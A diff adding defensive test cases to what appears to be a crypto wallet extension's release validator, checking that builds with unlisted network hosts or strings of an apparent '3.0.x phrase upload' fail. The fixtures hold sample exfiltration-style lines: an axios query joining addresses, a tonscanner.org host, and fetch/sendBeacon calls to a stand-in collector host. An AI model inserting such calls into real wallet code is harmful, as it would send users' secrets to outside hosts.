@@ -659,6 +659,39 @@ async function run() {
       /homepage_url must be https:\/\/fearlesswallet\.io\//u
     );
     await expectFailure(tempRoot, 'missing-page', { removeFiles: ['page.js'] }, /missing required file page\.js/u);
+    // The 3.0.x phrase upload and any unreviewed host fail every build, release or not.
+    await expectPass(tempRoot, 'listed-host', {
+      extraFiles: [['chunks/ton.js', 'fetch("https://ti.soramitsu.io/api/indexer/v1/accounts")\n']],
+    });
+    await expectFailure(
+      tempRoot,
+      'phrase-upload-path',
+      { extraFiles: [['chunks/balance.js', 'axios.get(`${ton}/whitelist?address=${address.join(";")}`)\n']] },
+      /Chrome directory artifact contains strings of the 3\.0\.x phrase upload: chunks\/balance\.js: whitelist\?address/u
+    );
+    await expectFailure(
+      tempRoot,
+      'collection-host',
+      { extraFiles: [['assets/data.json', '{"ton":"https://tonscanner.org"}\n']] },
+      /3\.0\.x phrase upload: assets\/data\.json: tonscanner/u
+    );
+    await expectFailure(
+      tempRoot,
+      'unlisted-host',
+      { extraFiles: [['chunks/beacon.js', 'navigator.sendBeacon("https://collector.example.net/c")\n']] },
+      /names network hosts outside scripts\/release-network-hosts\.json: collector\.example\.net \(chunks\/beacon\.js\)/u
+    );
+    await expectFailure(
+      tempRoot,
+      'zip-only-host',
+      {
+        mutateZipEntries: (entries) =>
+          entries.map((entry) =>
+            entry.name === 'popup.js' ? { ...entry, data: Buffer.from('fetch("https://collector.example.net")\n') } : entry
+          ),
+      },
+      /Chrome ZIP artifact names network hosts outside/u
+    );
     await expectFailure(
       tempRoot,
       'wrong-icon-size',
